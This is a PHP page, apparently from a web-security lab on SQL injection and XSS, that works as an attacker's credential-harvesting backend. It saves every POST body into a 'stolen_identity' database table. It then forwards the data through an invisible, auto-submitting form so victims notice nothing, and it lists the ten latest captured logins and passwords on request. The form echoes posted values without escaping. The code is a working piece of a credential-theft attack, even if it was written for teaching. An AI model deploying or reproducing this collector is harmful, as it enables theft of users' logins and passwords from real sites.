<?php 

$db_host = 'postgres';
$db_name = 'hacker_db';
$db_user = 'hacker';
$db_password = 'cool_hacker';

try {
	$dsn = "pgsql:host=$db_host;port=5432;dbname=$db_name;";
	$db = new PDO($dsn, $db_user, $db_password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);

	$template = 'show';

	$data = NULL;

	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		$data = json_encode($_POST);
		$referer = $_SERVER['HTTP_REFERER'];
		$error = $db->prepare('INSERT INTO stolen_identity("data") VALUES (?)')
			->execute([$data]);

		$template = 'redirect';
#		header('HTTP/1.1 302 Found');
#		header("Location: $referer");
	}

	$query = 'SELECT * FROM "stolen_identity" ORDER BY id DESC LIMIT 10';
	$items = $db->query($query)->fetchAll(PDO::FETCH_ASSOC);

} catch (PDOException $e) {
	$error = $e->getMessage();
} finally {
	if (isset($pdo)) {
		$pdo = null;
	}
}

?>

<?php if($template === 'show'): ?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Вход в мир внедрения кода SQL-injection</title>
	<link href="default.css" rel="stylesheet">
</head>
<body>

	<h1 style="text-align:center">Логины и пароли восторженных пользователей</h1>

	<table>
		<thead>
			<th>Логин</th>
			<th>Пароль</th>
		</thead>
		<tbody>
			<?php foreach($items as $i): ?>
				<tr>
					<td><?= $i['id'] ?></td>
					<td><?= $i['data'] ?></td>
				</tr>
			<?php endforeach; ?>
		</tbody>
	</table>

</body>

</html>

<?php else: ?>

<form action="/xss/comments/" method="post" style="opacity:0">
	<?php foreach($_POST as $key => $value): ?>
		<input name="<?= $key ?>" value="<?= $value ?>" type="hidden">
	<?php endforeach; ?>
	<input type="submit" id="submit">
</form>

<script>
	window.onload = () => {
		console.log('start');
		document.getElementById('submit').click();
		console.log('finish');
	};
</script>

<?php endif; ?>
